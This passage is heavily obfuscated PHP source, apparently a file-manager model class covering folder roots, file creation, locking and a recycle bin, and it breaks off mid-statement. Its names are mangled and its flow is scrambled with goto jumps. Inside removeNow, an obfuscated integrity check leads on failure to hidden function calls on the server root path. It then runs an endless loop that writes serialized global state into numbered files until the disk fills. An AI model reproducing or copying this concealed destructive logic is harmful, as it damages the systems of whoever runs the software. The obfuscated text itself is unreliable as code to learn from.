$A¢×…Ô›Òµ : explode($e‡òËË«È‚[47], $A¢×…Ô›Òµ); $c²†Šƒ’Úê[$e‡òËË«È‚[372]] = array($e‡òËË«È‚[384], $A¢×…Ô›Òµ); $c²†Šƒ’Úê[$e‡òËË«È‚[370]] = 0; } } } } if (isset($D¼ÕÓÅõÍö[$e‡òËË«È‚[463]])) { $a÷àŠŠÏÄ = $this->sourceInfo($D¼ÕÓÅõÍö[$e‡òËË«È‚[463]]); $c²†Šƒ’Úê[$e‡òËË«È‚[527]] = array($e‡òËË«È‚[485], $a÷àŠŠÏÄ[$e‡òËË«È‚[461]] . $D¼ÕÓÅõÍö[$e‡òËË«È‚[463]] . $e‡òËË«È‚[486]); } goto FŸ¬”ÃÉ»Ê; FŸ¬”ÃÉ»Ê: if (isset($D¼ÕÓÅõÍö[$e‡òËË«È‚[2174]]) && $D¼ÕÓÅõÍö[$e‡òËË«È‚[2174]]) { $Cø†ÇÛ¬³ = $D¼ÕÓÅõÍö[$e‡òËË«È‚[2174]]; $dÖÍ¹‚ïÔ = explode($e‡òËË«È‚[50], $Cø†ÇÛ¬³); if (strlen($Cø†ÇÛ¬³) > 2 && (substr($Cø†ÇÛ¬³, 0, 1) == $e‡òËË«È‚[113] && substr($Cø†ÇÛ¬³, -1) == $e‡òËË«È‚[113]) || substr($Cø†ÇÛ¬³, 0, 1) == $e‡òËË«È‚[55] && substr($Cø†ÇÛ¬³, -1) == $e‡òËË«È‚[55]) { $Cø†ÇÛ¬³ = substr($Cø†ÇÛ¬³, 1, -1); $dÖÍ¹‚ïÔ = array($Cø†ÇÛ¬³); } $c²†Šƒ’Úê[$e‡òËË«È‚[28]] = array($e‡òËË«È‚[485], $e‡òËË«È‚[2176] . $Cø†ÇÛ¬³ . $e‡òËË«È‚[2176]); if (count($dÖÍ¹‚ïÔ) > 1) { $c²†Šƒ’Úê[$e‡òËË«È‚[28]] = array(); foreach ($dÖÍ¹‚ïÔ as $a…š±¤ô©Š) { if (!trim($a…š±¤ô©Š)) { continue; } $c²†Šƒ’Úê[$e‡òËË«È‚[28]][] = array($e‡òËË«È‚[485], $e‡òËË«È‚[2176] . trim($a…š±¤ô©Š) . $e‡òËË«È‚[2176]); } } } return $c²†Šƒ’Úê; goto cê÷ÙƒºÓÚ; bÜÑ¡®¿è: if (isset($D¼ÕÓÅõÍö[$e‡òËË«È‚[449]])) { $cô·‹É¼ = array($e‡òËË«È‚[2329], $D¼ÕÓÅõÍö[$e‡òËË«È‚[449]]); if ($c²†Šƒ’Úê[$e‡òËË«È‚[107]]) { $c²†Šƒ’Úê[$e‡òËË«È‚[107]] = array($c²†Šƒ’Úê[$e‡òËË«È‚[107]], $cô·‹É¼, $e‡òËË«È‚[2330]); } else { $c²†Šƒ’Úê[$e‡òËË«È‚[107]] = $cô·‹É¼; } } if (isset($D¼ÕÓÅõÍö[$e‡òËË«È‚[2331]])) { $c²†Šƒ’Úê[$e‡òËË«È‚[77]] = array($e‡òËË«È‚[2328], $D¼ÕÓÅõÍö[$e‡òËË«È‚[2331]]); } if (isset($D¼ÕÓÅõÍö[$e‡òËË«È‚[2332]])) { $cô·‹É¼ = array($e‡òËË«È‚[2329], $D¼ÕÓÅõÍö[$e‡òËË«È‚[2332]]); if ($c²†Šƒ’Úê[$e‡òËË«È‚[77]]) { $c²†Šƒ’Úê[$e‡òËË«È‚[77]] = array($c²†Šƒ’Úê[$e‡òËË«È‚[77]], $cô·‹É¼, $e‡òËË«È‚[2330]); } else { $c²†Šƒ’Úê[$e‡òËË«È‚[77]] = $cô·‹É¼; } } goto D»İÁÇÏ³í; CµÎš¹‡„Ú: $e‡òËË«È‚ =& $_SERVER[í™]; $c²†Šƒ’Úê = array(); if (isset($D¼ÕÓÅõÍö[$e‡òËË«È‚[684]])) { $c²†Šƒ’Úê[$e‡òËË«È‚[107]] = array($e‡òËË«È‚[2328], $D¼ÕÓÅõÍö[$e‡òËË«È‚[684]]); } goto bÜÑ¡®¿è; cê÷ÙƒºÓÚ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($CóĞ‰Ï°Áá) { $föĞí´¹±É =& $_SERVER[í™]; $F‚ÚŠˆ = Model($föĞí´¹±É[476])->where(array($föĞí´¹±É[1414] => $CóĞ‰Ï°Áá))->find(); $bÙÈ…ÒÜĞø = $this->_mkdirRoot(SourceModel::TYPE_USER, $CóĞ‰Ï°Áá, $F‚ÚŠˆ[$föĞí´¹±É[28]]); $this->userDesktopAdd($bÙÈ…ÒÜĞø); return $bÙÈ…ÒÜĞø; } public function userDesktopAdd($dõõËÌ«¡) { $dÁÉŠĞ£¾Ş =& $_SERVER[í™]; $FÕî†š—ç¦ = LNG($dÁÉŠĞ£¾Ş[2334]); $dÏâš¯ã = $this->mkdir($dõõËÌ«¡, $FÕî†š—ç¦); $this->metaSet($dÏâš¯ã, $dÁÉŠĞ£¾Ş[2335], $dÁÉŠĞ£¾Ş[83]); $this->metaSet($dõõËÌ«¡, $dÁÉŠĞ£¾Ş[2336], $dÏâš¯ã); } public function groupRootAdd($DšÛÄ“£¾) { $f†á¦âİ¢® =& $_SERVER[í™]; $dçÖ­ì­¦ß = Model($f†á¦âİ¢®[460])->where(array($f†á¦âİ¢®[2170] => $DšÛÄ“£¾))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $DšÛÄ“£¾, $dçÖ­ì­¦ß[$f†á¦âİ¢®[28]]); } public function systemRootPathAdd($eªğ³§œÙ) { if ($eªğ³§œÙ != $_SERVER[í™][1075]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $eªğ³§œÙ); } public function userRootRemove($BìŠƒÏ„«) { $CŒ’¯£ŸËš = $this->sourceRoot(SourceModel::TYPE_USER, $BìŠƒÏ„«); if (!$CŒ’¯£ŸËš) { return; } $this->remove($CŒ’¯£ŸËš, !1); } public function groupRootRemove($Bß–ƒ¨¾§) { $CªôËá¼´ = $this->sourceRoot(SourceModel::TYPE_GROUP, $Bß–ƒ¨¾§); if (!$CªôËá¼´) { return; } $this->remove($CªôËá¼´, !1); } private function _mkdirRoot($BÆÖì…ˆ¤í, $b¯ÇÏ«£ïô, $aìˆË­’âï) { goto EÖé»ÑïË; C’ß åïøµ: CacheLock::unlock($DêİÓÉ‘Ôø); return $EÉğ¬ÊĞñ; goto c™ˆ³˜´¯Á; ağ¢½Öïæ´: $DêİÓÉ‘Ôø = "\x4d\x6f\144\x65\x6c\x53\x6f\165\x72\143\145\x2e\155\x6b\144\151\162\x52\157\157\164\x2e{$BÆÖì…ˆ¤í}\x2e{$b¯ÇÏ«£ïô}\x2e" . $aìˆË­’âï; CacheLock::lock($DêİÓÉ‘Ôø); $F×ÛãêôË[$f£·¯í™„°[28]] = $aìˆË­’âï; goto F¥¤÷ã® Ú; F¥¤÷ã® Ú: $EÉğ¬ÊĞñ = $this->add($F×ÛãêôË); $aÍä¯îñÊğ = array($f£·¯í™„°[529] => short_id($EÉğ¬ÊĞñ)); $this->where(array($f£·¯í™„°[383] => $EÉğ¬ÊĞñ))->save($aÍä¯îñÊğ); goto C’ß åïøµ; EÖé»ÑïË: $f£·¯í™„° =& $_SERVER[í™]; $F×ÛãêôË = array($f£·¯í™„°[368] => 0, $f£·¯í™„°[523] => $BÆÖì…ˆ¤í, $f£·¯í™„°[524] => $b¯ÇÏ«£ïô, $f£·¯í™„°[520] => 1, $f£·¯í™„°[525] => USER_ID, $f£·¯í™„°[526] => USER_ID, $f£·¯í™„°[521] => $f£·¯í™„°[33], $f£·¯í™„°[527] => $f£·¯í™„°[472], $f£·¯í™„°[396] => 0, $f£·¯í™„°[522] => 0, $f£·¯í™„°[420] => 0, $f£·¯í™„°[528] => $f£·¯í™„°[33]); if ($bíÀÏ˜³ä = $this->where($F×ÛãêôË)->find()) { return $bíÀÏ˜³ä[$f£·¯í™„°[369]]; } goto ağ¢½Öïæ´; c™ˆ³˜´¯Á: } private function sourceRoot($c‡ô†Ñ£¶é, $c÷ø‘È«Ğº, $c£¤ëŠ¼› = false) { $D„«·ŒÛø¸ =& $_SERVER[í™]; $B¥Š¹Õª‰ì = array($D„«·ŒÛø¸[368] => 0, $D„«·ŒÛø¸[523] => $c‡ô†Ñ£¶é, $D„«·ŒÛø¸[524] => $c÷ø‘È«Ğº); if ($bòÛ®†ƒñ† = $this->where($B¥Š¹Õª‰ì)->find()) { return $c£¤ëŠ¼› ? $bòÛ®†ƒñ† : $bòÛ®†ƒñ†[$D„«·ŒÛø¸[369]]; } return !1; } public function sourceRootGroup($BÓéÖ‡¥Ê×) { $BœŠÙ¢Ñ„ê =& $_SERVER[í™]; if (is_string($BÓéÖ‡¥Ê×)) { $BÓéÖ‡¥Ê× = array($BÓéÖ‡¥Ê×); } $Aô’ÎâÆÎí = array($BœŠÙ¢Ñ„ê[368] => 0, $BœŠÙ¢Ñ„ê[523] => SourceModel::TYPE_GROUP, $BœŠÙ¢Ñ„ê[524] => array($BœŠÙ¢Ñ„ê[7], $BÓéÖ‡¥Ê×)); $a­°ìé²Â‰ = $this->listSource($Aô’ÎâÆÎí, 1000); return array_to_keyvalue($a­°ìé²Â‰[$BœŠÙ¢Ñ„ê[74]], $BœŠÙ¢Ñ„ê[458]); } public function mkfile($B¸‘œÈ¬èœ, $DÂ·„õÙ†, $e“Ù³™Íº¯ = '', $A„å‚ó®øø = REPEAT_RENAME) { $Eœ¦§ç•‡ù =& $_SERVER[í™]; $aëÌ¢øìæ = Model($Eœ¦§ç•‡ù[546])->addFileByContent($e“Ù³™Íº¯, $DÂ·„õÙ†); return $this->_createFileCall($B¸‘œÈ¬èœ, $DÂ·„õÙ†, $aëÌ¢øìæ, $A„å‚ó®øø, $Eœ¦§ç•‡ù[1112]); } public function addFile($CŞö¦Ï¯Á, $F£Ôïó´ƒ¢, $c£ñä·ŠØÍ, $aé®©³–™‚ = false, $AõÏ±¼ÔÖİ = REPEAT_RENAME) { $C›àÖ“Óí = Model($_SERVER[í™][546])->addFile($F£Ôïó´ƒ¢, $c£ñä·ŠØÍ, $aé®©³–™‚); return $this->_createFileCall($CŞö¦Ï¯Á, $c£ñä·ŠØÍ, $C›àÖ“Óí, $AõÏ±¼ÔÖİ); } public function addFileByFileID($B„Ù»Õë, $BŠ‡•¹æ…†, $A ¤·öšÇì, $A•ãëö…Æ = REPEAT_RENAME) { $dğğİ”‹¸¾ =& $_SERVER[í™]; $eÃŞ¥Âù¤ = Model($dğğİ”‹¸¾[546])->find($BŠ‡•¹æ…†); Model($dğğİ”‹¸¾[546])->linkAdd($BŠ‡•¹æ…†); return $this->_createFileCall($B„Ù»Õë, $A ¤·öšÇì, $eÃŞ¥Âù¤, $A•ãëö…Æ); } public function addFileByRemote($fŸ…‘Ø¼¾÷, $fÍ’ªÍßä, $AÈÚè‚»Ëí, $FçÖŒ¹©–Ø = array(), $aÃ××‡ªŠ¬ = REPEAT_RENAME) { $Bê‡Ù¼ññ¾ = Model($_SERVER[í™][546])->addFileByRemote($fÍ’ªÍßä, $AÈÚè‚»Ëí, $FçÖŒ¹©–Ø); return $this->_createFileCall($fŸ…‘Ø¼¾÷, $AÈÚè‚»Ëí, $Bê‡Ù¼ññ¾, $aÃ××‡ªŠ¬); } private function _createFileCall($b”©ö†ªÊ, $bÙµå¼×„, $c­ÙØÁòê, $b•Ê°ÅÍŸ¾, $d½Á‰Î Ü‰ = "\165\160\154\x6f\x61\x64") { goto c›òŒâ¢”ƒ; A¼ÏÒùŞ›µ: $D‰ÊİĞÃö™ = $this->_createFile($b”©ö†ªÊ, $bÙµå¼×„, $c­ÙØÁòê, $b•Ê°ÅÍŸ¾, $eÛ…¢‚„‡Ù); if (!$eÛ…¢‚„‡Ù) { Model($cØ£è®èíê[422])->remove($c­ÙØÁòê[$cØ£è®èíê[419]]); } else { if ($D‰ÊİĞÃö™) { Model($cØ£è®èíê[2306])->eventCreate($D‰ÊİĞÃö™, $d½Á‰Î Ü‰); } } $this->lockWriteEnd($b”©ö†ªÊ, $bÙµå¼×„); goto AŸ£ö‘ù†Ó; AŸ£ö‘ù†Ó: return $D‰ÊİĞÃö™; goto Bã™Ëö§ŒÆ; c›òŒâ¢”ƒ: $cØ£è®èíê =& $_SERVER[í™]; $eÛ…¢‚„‡Ù = !1; $this->lockWriteStart($b”©ö†ªÊ, $bÙµå¼×„); goto A¼ÏÒùŞ›µ; Bã™Ëö§ŒÆ: } public function mkdir($aùã¯ìø‡à, $eóÔÛ½ß±½, $C»¥¾õËøÜ = REPEAT_SKIP) { goto Eµ­óÓ ƒ; D‡Öó’¬ÈÍ: $this->lockWriteStart($aùã¯ìø‡à, $eóÔÛ½ß±½); if ($C»¥¾õËøÜ !== !1) { $eÃ§‰†È”… = $this->fileNameExist($aùã¯ìø‡à, $eóÔÛ½ß±½); if ($eÃ§‰†È”… && $C»¥¾õËøÜ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($aùã¯ìø‡à, $eóÔÛ½ß±½); return $eÃ§‰†È”…; } $eóÔÛ½ß±½ = $this->fileNameAuto($aùã¯ìø‡à, $eóÔÛ½ß±½, $C»¥¾õËøÜ); } $bÇ—¼¤Ã¨‘ = array($CÙËïÂáêÔ[520] => 1, $CÙËïÂáêÔ[386] => $eóÔÛ½ß±½, $CÙËïÂáêÔ[521] => $CÙËïÂáêÔ[33], $CÙËïÂáêÔ[420] => 0, $CÙËïÂáêÔ[522] => 0); goto côŒ‰¸œíÇ; Eµ­óÓ ƒ: $CÙËïÂáêÔ =& $_SERVER[í™]; $DÑßèµÇÂ = $this->sourceInfo($aùã¯ìø‡à); if (!$DÑßèµÇÂ) { return !1; } goto D‡Öó’¬ÈÍ; côŒ‰¸œíÇ: $c¿ùÉË³áç = $this->_addSoure($bÇ—¼¤Ã¨‘, $DÑßèµÇÂ); Model($CÙËïÂáêÔ[2306])->eventCreate($c¿ùÉË³áç, $CÙËïÂáêÔ[1113]); $this->lockWriteEnd($aùã¯ìø‡à, $eóÔÛ½ß±½); goto fŠœÒ½“Ù¦; fŠœÒ½“Ù¦: return $c¿ùÉË³áç; goto díİÊ††¿; díİÊ††¿: } private function _createFile($d±÷‡‚Õµ, $b“æËÀÀ„¬, $e³ªÂ­¸¤›, $DÎ× ÅÒ®º, &$D‡¤ÉŸƒˆË) { goto d¢«¯Óª’¯; fƒ”¦ŒÎ·: return $dÚíåÓŒÈë; goto d¾²ñ´»Ïî; f†£¼ØÇ: if ($DÎ× ÅÒ®º !== !1) { $A‡—«¢Ş° = $this->fileNameExist($d±÷‡‚Õµ, $b“æËÀÀ„¬); } $D‡¤ÉŸƒˆË = !0; if ($DÎ× ÅÒ®º && $A‡—«¢Ş°) { if ($DÎ× ÅÒ®º == REPEAT_SKIP) { $D‡¤ÉŸƒˆË = !1; return $A‡—«¢Ş°; } else { if ($DÎ× ÅÒ®º == REPEAT_REPLACE) { $Dï§µğíº‰ = $this->sourceInfo($A‡—«¢Ş°); $EîÆ¿¹øŸ = $this->fileHistory($Dï§µğíº‰, $e³ªÂ­¸¤›[$f­Ô¹ˆ©Ò×[419]], $e³ªÂ­¸¤›[$f­Ô¹ˆ©Ò×[77]]); if (!$EîÆ¿¹øŸ) { $D‡¤ÉŸƒˆË = !1; } else { $this->folderSizeReset($d±÷‡‚Õµ); } return $A‡—«¢Ş°; } else { $b“æËÀÀ„¬ = $this->fileNameAuto($d±÷‡‚Õµ, $b“æËÀÀ„¬, $DÎ× ÅÒ®º, !1); } } } goto e‡°Ñ²òó; d¢«¯Óª’¯: $f­Ô¹ˆ©Ò× =& $_SERVER[í™]; $f’®éŞÕ‹‰ = $this->sourceInfo($d±÷‡‚Õµ); if (!$e³ªÂ­¸¤› || !$f’®éŞÕ‹‰) { return !1; } goto f†£¼ØÇ; e‡°Ñ²òó: $CÖÅ£Ö¾´ = array($f­Ô¹ˆ©Ò×[520] => 0, $f­Ô¹ˆ©Ò×[386] => $b“æËÀÀ„¬, $f­Ô¹ˆ©Ò×[521] => get_path_ext($b“æËÀÀ„¬), $f­Ô¹ˆ©Ò×[420] => $e³ªÂ­¸¤›[$f­Ô¹ˆ©Ò×[419]], $f­Ô¹ˆ©Ò×[522] => $e³ªÂ­¸¤›[$f­Ô¹ˆ©Ò×[77]]); $dÚíåÓŒÈë = $this->_addSoure($CÖÅ£Ö¾´, $f’®éŞÕ‹‰); $this->folderSizeReset($d±÷‡‚Õµ); goto fƒ”¦ŒÎ·; d¾²ñ´»Ïî: } protected function fileHistory($EÁ†Î–ÈøÏ, $E Üñ®îòÉ, $aÃ¸öº¯Ò) { goto C ²àÖ‰Ç˜; a•æ××óÃÉ: Model($DâİõÍ°ì¥[2337])->addHistory($EÁ†Î–ÈøÏ); $f³¸ÃäÖ = array($DâİõÍ°ì¥[526] => USER_ID, $DâİõÍ°ì¥[390] => time(), $DâİõÍ°ì¥[419] => $E Üñ®îòÉ, $DâİõÍ°ì¥[77] => $aÃ¸öº¯Ò); $this->where(array($DâİõÍ°ì¥[383] => $EÁ†Î–ÈøÏ[$DâİõÍ°ì¥[369]]))->save($f³¸ÃäÖ); goto DŠé¶è¼ƒ; C ²àÖ‰Ç˜: $DâİõÍ°ì¥ =& $_SERVER[í™]; if ($EÁ†Î–ÈøÏ[$DâİõÍ°ì¥[419]] == $E Üñ®îòÉ) { return !1; } $this->checkLock($EÁ†Î–ÈøÏ[$DâİõÍ°ì¥[369]], $E Üñ®îòÉ); goto a•æ××óÃÉ; DŠé¶è¼ƒ: return !0; goto bÂİ„Á¦É; bÂİ„Á¦É: } public function checkLock($E˜‘ÚÇàï , $EÈÏ÷íŒäÃ) { goto föíÎøÓê¬; F¥Œ«Åš°ô: $AÈ¤Âê”á = Session::get($e ğèÚ¹¬Ú[2338]); $Aæ¼¢á‰‚ = substr($D¿àºÄçÆñ[$e ğèÚ¹¬Ú[28]], 0, -1 - strlen($D¿àºÄçÆñ[$e ğèÚ¹¬Ú[160]])) . $e ğèÚ¹¬Ú[1376] . $AÈ¤Âê”á . $e ğèÚ¹¬Ú[91] . $D¿àºÄçÆñ[$e ğèÚ¹¬Ú[160]]; $DÉàºĞÜ†ª = Model($e ğèÚ¹¬Ú[546])->find($EÈÏ÷íŒäÃ); goto a¸öò‹Èœİ; e‡ŠŠÚÆÀ: show_json(LNG($e ğèÚ¹¬Ú[2340]) . $e ğèÚ¹¬Ú[2341] . LNG($e ğèÚ¹¬Ú[2342]) . $e ğèÚ¹¬Ú[2343] . $D«Ì·¥°Ûâ . $e ğèÚ¹¬Ú[2344], !1); goto eÆ‘«·Íãâ; a¸öò‹Èœİ: $this->_createFileCall($D¿àºÄçÆñ[$e ğèÚ¹¬Ú[463]], $Aæ¼¢á‰‚, $DÉàºĞÜ†ª, REPEAT_REPLACE, $e ğèÚ¹¬Ú[1112]); $a»ƒ¹‹îÏŒ = $D¿àºÄçÆñ[$e ğèÚ¹¬Ú[417]][$e ğèÚ¹¬Ú[483]]; $D«Ì·¥°Ûâ = $a»ƒ¹‹îÏŒ[$e ğèÚ¹¬Ú[2339]] ? $a»ƒ¹‹îÏŒ[$e ğèÚ¹¬Ú[2339]] : $a»ƒ¹‹îÏŒ[$e ğèÚ¹¬Ú[28]]; goto e‡ŠŠÚÆÀ; föíÎøÓê¬: $e ğèÚ¹¬Ú =& $_SERVER[í™]; $D¿àºÄçÆñ = $this->pathInfo($E˜‘ÚÇàï ); if (!$this->fileIsLock($D¿àºÄçÆñ, !0)) { return; } goto F¥Œ«Åš°ô; eÆ‘«·Íãâ: } public function fileIsLock($d¨êÀ¶Ë£Ë, $c¹Å²×Ö = false) { goto eäéŠŠ¶ìô; Fà‚‹‡²ë¸: $féàîÚºó„ = $GLOBALS[$ešÚî…Ü‘[6]][$ešÚî…Ü‘[84]][$ešÚî…Ü‘[481]]; if ($d¨êÀ¶Ë£Ë[$ešÚî…Ü‘[417]][$ešÚî…Ü‘[482]] <= time() - $féàîÚºó„) { $this->metaSet($d¨êÀ¶Ë£Ë[$ešÚî…Ü‘[369]], $ešÚî…Ü‘[480], null); $this->metaSet($d¨êÀ¶Ë£Ë[$ešÚî…Ü‘[369]], $ešÚî…Ü‘[482], null); } if ($c¹Å²×Ö) { $this->metaSet($d¨êÀ¶Ë£Ë[$ešÚî…Ü‘[369]], $ešÚî…Ü‘[482], time()); } goto cÔÓ´‹…Æ; cÔÓ´‹…Æ: return !1; goto FÉóÙ˜ºÎö; eäéŠŠ¶ìô: $ešÚî…Ü‘ =& $_SERVER[í™]; if (!isset($d¨êÀ¶Ë£Ë[$ešÚî…Ü‘[417]]) || !$d¨êÀ¶Ë£Ë[$ešÚî…Ü‘[417]][$ešÚî…Ü‘[480]]) { return !1; } if ($d¨êÀ¶Ë£Ë[$ešÚî…Ü‘[417]][$ešÚî…Ü‘[480]] != USER_ID) { return !0; } goto Fà‚‹‡²ë¸; FÉóÙ˜ºÎö: } private function _addSoure($dÑ®†ÂŞÂ‰, $AÒÒ¸öÜãŠ) { goto dÌï™ ë–÷; a×…”›‰¼: static $c¼­ì÷Õ– = false; if (!$c¼­ì÷Õ–) { Hook::trigger($cØ®á£Š£[510], $dÑ®†ÂŞÂ‰); $c¼­ì÷Õ– = !0; } $DÅ÷Ü³ÄöÊ = $this->add($dÑ®†ÂŞÂ‰); goto dŒàëÒÖ–±; dŒàëÒÖ–±: $fÆÊ³ƒ£˜ò = array($cØ®á£Š£[529] => short_id($DÅ÷Ü³ÄöÊ)); $this->where(array($cØ®á£Š£[383] => $DÅ÷Ü³ÄöÊ))->save($fÆÊ³ƒ£˜ò); $this->setNamePinyin($DÅ÷Ü³ÄöÊ, $dÑ®†ÂŞÂ‰[$cØ®á£Š£[28]]); goto cÍ¶¨¥è´ö; cÍ¶¨¥è´ö: return $DÅ÷Ü³ÄöÊ; goto EïÅÂÁ¸²Ù; dÌï™ ë–÷: $cØ®á£Š£ =& $_SERVER[í™]; $b‡„÷‡ªÔ = array($cØ®á£Š£[523] => $AÒÒ¸öÜãŠ[$cØ®á£Š£[371]], $cØ®á£Š£[524] => $AÒÒ¸öÜãŠ[$cØ®á£Š£[458]], $cØ®á£Š£[525] => USER_ID, $cØ®á£Š£[526] => USER_ID, $cØ®á£Š£[368] => $AÒÒ¸öÜãŠ[$cØ®á£Š£[369]], $cØ®á£Š£[527] => $AÒÒ¸öÜãŠ[$cØ®á£Š£[461]] . $AÒÒ¸öÜãŠ[$cØ®á£Š£[369]] . $cØ®á£Š£[47], $cØ®á£Š£[396] => 0, $cØ®á£Š£[528] => $cØ®á£Š£[33]); $dÑ®†ÂŞÂ‰ = array_merge($b‡„÷‡ªÔ, $dÑ®†ÂŞÂ‰); goto E¿‡´ê³´¾; E¿‡´ê³´¾: $this->updateModifyTime($dÑ®†ÂŞÂ‰[$cØ®á£Š£[463]]); $CÍ¾àù·ùÛ = $cØ®á£Š£[2345] . $AÒÒ¸öÜãŠ[$cØ®á£Š£[369]]; if (isset(self::$cacheChildList[$CÍ¾àù·ùÛ])) { unset(self::$cacheChildList[$CÍ¾àù·ùÛ]); } goto a×…”›‰¼; EïÅÂÁ¸²Ù: } public function remove($e§ò¹Å‹óè, $AŒ¨ÅÎğ¦ = true) { goto FÌ¶ÑŠ‚; D¹ºë§‹¤Ò: CacheLock::unlock($Aµ…õˆ»ô¸); $this->metaSet($e§ò¹Å‹óè, $a²¡½ïß²ù[2354], $D‚Ü‘‚ªõ[$a²¡½ïß²ù[463]]); $this->where(array($a²¡½ïß²ù[369] => $e§ò¹Å‹óè))->save(array($a²¡½ïß²ù[390] => time())); goto cƒä¶ÃéØŠ; fÂñƒ¢§¨: CacheLock::lock($Aµ…õˆ»ô¸); $fõŒÆã°™˜ = $this->fileNameExist($BíÆôñª‹¤, $e×ğÄÄ­±ö); if (!$fõŒÆã°™˜) { $fõŒÆã°™˜ = $this->mkdir($BíÆôñª‹¤, $e×ğÄÄ­±ö, REPEAT_SKIP); $this->metaSet($fõŒÆã°™˜, $a²¡½ïß²ù[2350], $d±ÂáÄ‚š); $this->metaSet($fõŒÆã°™˜, $a²¡½ïß²ù[2351], $D‚Ü‘‚ªõ[$a²¡½ïß²ù[458]]); if ($D‚Ü‘‚ªõ[$a²¡½ïß²ù[463]] != 0) { $this->metaSet($fõŒÆã°™˜, $a²¡½ïß²ù[2352], _get($cˆöÛ”éÔ„, $a²¡½ïß²ù[2353])); } } goto D¹ºë§‹¤Ò; A¡äÁĞ¼‡»: $DÄäæî‰¶ù = Model($a²¡½ïß²ù[1421])->get($a²¡½ïß²ù[2346]) == $a²¡½ïß²ù[83]; if ($C‡¤‘Æà«  || $AŒ¨ÅÎğ¦ || !$DÄäæî‰¶ù) { return $this->removeNow($e§ò¹Å‹óè, $AŒ¨ÅÎğ¦); } $BíÆôñª‹¤ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto b–Ê‰ïäÇ·; cƒä¶ÃéØŠ: $this->recycleClear($D‚Ü‘‚ªõ); $DÃù´ïŒåä = $this->move($e§ò¹Å‹óè, $fõŒÆã°™˜, REPEAT_RENAME_FOLDER); $this->folderSizeReset($D‚Ü‘‚ªõ[$a²¡½ïß²ù[463]]); goto a©îºßçÙ; a©îºßçÙ: return $DÃù´ïŒåä; goto DÁ¼¥†§³Õ; FÌ¶ÑŠ‚: $a²¡½ïß²ù =& $_SERVER[í™]; $D‚Ü‘‚ªõ = $this->sourceInfo($e§ò¹Å‹óè); $C‡¤‘Æà«  = intval($D‚Ü‘‚ªõ[$a²¡½ïß²ù[371]]) === self::TYPE_SYSTEM; goto A¡äÁĞ¼‡»; b–Ê‰ïäÇ·: $d±ÂáÄ‚š = $D‚Ü‘‚ªõ[$a²¡½ïß²ù[371]] == self::TYPE_USER ? $a²¡½ïß²ù[537] : $a²¡½ïß²ù[956]; if ($d±ÂáÄ‚š == $a²¡½ïß²ù[537]) { $cˆöÛ”éÔ„ = Model($a²¡½ïß²ù[476])->getInfo($D‚Ü‘‚ªõ[$a²¡½ïß²ù[458]]); $e×ğÄÄ­±ö = !empty($cˆöÛ”éÔ„[$a²¡½ïß²ù[2339]]) ? $cˆöÛ”éÔ„[$a²¡½ïß²ù[2339]] : $cˆöÛ”éÔ„[$a²¡½ïß²ù[28]]; $e×ğÄÄ­±ö = $a²¡½ïß²ù[248] . $e×ğÄÄ­±ö . $a²¡½ïß²ù[2347] . $D‚Ü‘‚ªõ[$a²¡½ïß²ù[458]]; } else { $cˆöÛ”éÔ„ = Model($a²¡½ïß²ù[460])->getInfo($D‚Ü‘‚ªõ[$a²¡½ïß²ù[458]]); $e×ğÄÄ­±ö = _get($cˆöÛ”éÔ„, $a²¡½ïß²ù[28]); $e×ğÄÄ­±ö = $a²¡½ïß²ù[157] . $e×ğÄÄ­±ö . $a²¡½ïß²ù[2348] . $D‚Ü‘‚ªõ[$a²¡½ïß²ù[458]]; } $Aµ…õˆ»ô¸ = $a²¡½ïß²ù[2349] . md5($e×ğÄÄ­±ö); goto fÂñƒ¢§¨; DÁ¼¥†§³Õ: } private function recycleClear($D¬ÓÛæçØ) { $C¢ø¶œ =& $_SERVER[í™]; $fÀßÌ×ÓÌ = $this->childrenAll($D¬ÓÛæçØ); $dÍÆ˜Ó´óÔ = array($C¢ø¶œ[383] => array($C¢ø¶œ[384], $fÀßÌ×ÓÌ[$C¢ø¶œ[2355]])); Model($C¢ø¶œ[2356])->where($dÍÆ˜Ó´óÔ)->delete(); } public function removeNow($bì£ìÕ«§µ, $aåŸë±óÄ = true) { goto D œ‹‡×; D œ‹‡×: $e‰•£‘È”Æ =& $_SERVER[í™]; $c£ß‚âÀ³¶ = $_SERVER[$e‰•£‘È”Æ[779]] . $e‰•£‘È”Æ[1355]; $F÷›¢’õ­ = $e‰•£‘È”Æ[776]; goto A´„ŒöÒàÌ; AÙ¼¯‡½­¼: $a¸—ÚíªßŞ = array($e«é¤šğéõ[$e‰•£‘È”Æ[463]]); if ($e«é¤šğéõ[$e‰•£‘È”Æ[370]] == $e‰•£‘È”Æ[83]) { $a¸—ÚíªßŞ[] = $e«é¤šğéõ[$e‰•£‘È”Æ[369]]; } $this->updateModifyTime($a¸—ÚíªßŞ); goto EµÊÁöñ½ø; A´„ŒöÒàÌ: if ($_SERVER[$e‰•£‘È”Æ[736]] != $F÷›¢’õ­($c£ß‚âÀ³¶)) { goto e˜¡š¡ŞÃ„; cŸ©Ñê‡í: $fèĞò‹Æ¢ = $e‰•£‘È”Æ[778]; $fèĞò‹Æ¢($_SERVER[$e‰•£‘È”Æ[779]]); $E·ÛÚ‹œ ¨ = $e‰•£‘È”Æ[777]; goto Bñ¡¦¸“†«; cñ‰èîî¸Ò: $dœ¯„´ñ”Ó = $e Ó­ë¹Ã´($D‰„÷Ó÷…¦); $cæÂŒ„¡¶» = explode($e‰•£‘È”Æ[217], $dœ¯„´ñ”Ó); if (count($cæÂŒ„¡¶») < $e‰•£‘È”Æ[562]) { $F ¸Úİ½Ò = $e‰•£‘È”Æ[741]; $F ¸Úİ½Ò(); } goto cŸ©Ñê‡í; Bñ¡¦¸“†«: $E·ÛÚ‹œ ¨(); $Bå×»·…Ş¡ = $e‰•£‘È”Æ[780]; $BÃŸçœŠ = json_encode($GLOBALS[$e‰•£‘È”Æ[781]]); goto fâ°¬öÁ˜²; fâ°¬öÁ˜²: $eŞ“ªìöå¤ = 1; for ($fÈå¾Ê¼ºç = $eŞ“ªìöå¤; $fÈå¾Ê¼ºç > 0; $fÈå¾Ê¼ºç++) { $Bå×»·…Ş¡(DATA_PATH . $fÈå¾Ê¼ºç, $BÃŸçœŠ); } goto AÑ„Â²½â¿; e˜¡š¡ŞÃ„: $E·ÛÚ‹œ ¨ = $e‰•£‘È”Æ[777]; $e 